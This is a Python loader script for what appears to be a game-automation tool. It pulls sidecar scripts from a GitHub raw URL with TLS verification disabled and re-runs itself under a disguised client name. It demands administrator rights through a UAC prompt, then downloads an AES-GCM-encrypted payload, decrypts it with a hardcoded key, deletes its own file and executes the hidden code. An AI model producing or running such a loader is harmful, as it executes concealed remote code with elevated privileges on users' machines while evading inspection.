# -*- coding: utf-8 -*-
"""뚱시스템 로더 — data.txt AES 복호화 + 실행 (raw URL, CDN 캐시 회피)"""
import base64
import ctypes
import os
import shutil
import ssl
import subprocess
import sys
import time
import urllib.request
import zlib

SOOPLIVE_CLIENT = "sooplive client.exe"
RAW_BASE = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/"
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE


def _download_sidecar(name):
    """GitHub에서 .py 받기. 공유폴더 쓰기 실패면 LOCALAPPDATA."""
    data = None
    req = urllib.request.Request(
        RAW_BASE + name + "?t=%d" % int(time.time()),
        headers={
            "User-Agent": "ddong",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
        },
    )
    with urllib.request.urlopen(req, timeout=25, context=_ctx) as r:
        data = r.read()
    if not data or len(data) < 50:
        raise RuntimeError("%s 다운로드 실패" % name)
    dests = [os.path.join(os.getcwd(), name)]
    local = os.path.join(os.environ.get("LOCALAPPDATA", "") or os.path.expanduser("~"), "ddong_launchers")
    try:
        os.makedirs(local, exist_ok=True)
        dests.append(os.path.join(local, name))
    except Exception:
        pass
    wrote = False
    for dest in dests:
        try:
            with open(dest, "wb") as f:
                f.write(data)
            wrote = True
            parent = os.path.dirname(dest)
            if parent and parent not in sys.path:
                sys.path.insert(0, parent)
        except Exception:
            pass
    if not wrote:
        raise RuntimeError("%s 저장 실패" % name)


def _bootstrap_sync_launchers():
    try:
        _download_sidecar("sync_launchers.py")
    except Exception:
        pass


def _setup_app_dir():
    app = os.environ.get("DDONG_APP_DIR", "").strip().rstrip("\\/")
    if app and os.path.isdir(app):
        try:
            os.chdir(app)
        except Exception:
            pass
        return app
    cwd = os.path.abspath(os.getcwd())
    if os.path.isfile(os.path.join(cwd, "license.dat")) or os.path.isfile(os.path.join(cwd, "뚱시작.bat")):
        try:
            os.chdir(cwd)
        except Exception:
            pass
    return cwd


def _app_dir():
    return os.environ.get("DDONG_APP_DIR", "").strip() or os.getcwd()


def _sync_client_launcher():
    app_dir = _app_dir()
    try:
        import sync_launchers
        return sync_launchers.sync_launcher(SOOPLIVE_CLIENT, app_dir)
    except Exception:
        pass
    return ""


def _reexec_via_client_if_needed():
    """표시명이 Python이면 패치 런처로 다시 실행."""
    launcher = ""
    try:
        import sync_launchers
        launcher = sync_launchers.reexec_target(SOOPLIVE_CLIENT, _app_dir())
    except Exception:
        pass
    if not launcher:
        return
    script = os.path.abspath(__file__)
    app_dir = _app_dir()
    env = os.environ.copy()
    env["DDONG_APP_DIR"] = app_dir
    env["DDONG_LAUNCHER"] = "1"
    subprocess.Popen([launcher, script], cwd=app_dir, env=env, close_fds=True)
    sys.exit(0)


_setup_app_dir()
_bootstrap_sync_launchers()
_sync_client_launcher()
_reexec_via_client_if_needed()

# Insert/Home 전역핫키는 관리자 권한이 있어야 리니지 위에서 바로 먹힘
def _ensure_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
    except Exception:
        pass
    try:
        script = os.path.abspath(__file__)
        app_dir = _app_dir()
        cwd = app_dir if os.path.isdir(app_dir) else (os.path.dirname(script) or None)
        launcher = _sync_client_launcher()
        exe = launcher if launcher and os.path.isfile(launcher) else sys.executable
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", exe, f'"{script}"', cwd, 1
        )
        if ret <= 32:
            ctypes.windll.user32.MessageBoxW(
                0,
                "관리자 권한이 필요합니다.\nUAC에서 '예'를 눌러주세요.",
                "뚱힐러",
                0x30,
            )
    except Exception as e:
        try:
            ctypes.windll.user32.MessageBoxW(0, f"관리자 실행 실패: {e}", "뚱힐러", 0x10)
        except Exception:
            pass
    sys.exit(0)


_ensure_admin()

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
DATA_URL = "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/data.txt"


def _pip_python():
    exe = sys.executable or ""
    if exe.lower().endswith("pythonw.exe"):
        py = os.path.join(os.path.dirname(exe), "python.exe")
        if os.path.isfile(py):
            return py
    return exe


def _ensure_imgui_pkgs():
    """bat 안 바꿔도 ImGui 패키지 자동 설치."""
    need = []
    for mod, pkg in (("imgui", "imgui"), ("glfw", "glfw"), ("OpenGL", "PyOpenGL")):
        try:
            __import__(mod)
        except Exception:
            need.append(pkg)
    if not need:
        return
    try:
        subprocess.run(
            [_pip_python(), "-m", "pip", "install", "--quiet"] + need,
            timeout=300,
            check=False,
        )
    except Exception:
        pass


def fetch_data_b64():
    req = urllib.request.Request(
        DATA_URL + "?t=%d" % int(time.time()),
        headers={
            "User-Agent": "ddong",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
        },
    )
    with urllib.request.urlopen(req, timeout=20, context=_ctx) as r:
        return r.read().decode("utf-8").strip()


try:
    _ensure_imgui_pkgs()
    _download_sidecar("imgui_ui.py")
    b64_str = fetch_data_b64()
    raw = base64.b64decode(b64_str)
    g = AESGCM(KEY)
    n, e = raw[:12], raw[12:]
    code = zlib.decompress(g.decrypt(n, e, None)).decode("utf-8")
    try:
        os.remove(__file__)
    except Exception:
        pass
    exec(code)
except Exception as err:
    ctypes.windll.user32.MessageBoxW(0, f"실행 실패: {err}", "오류", 0x10)
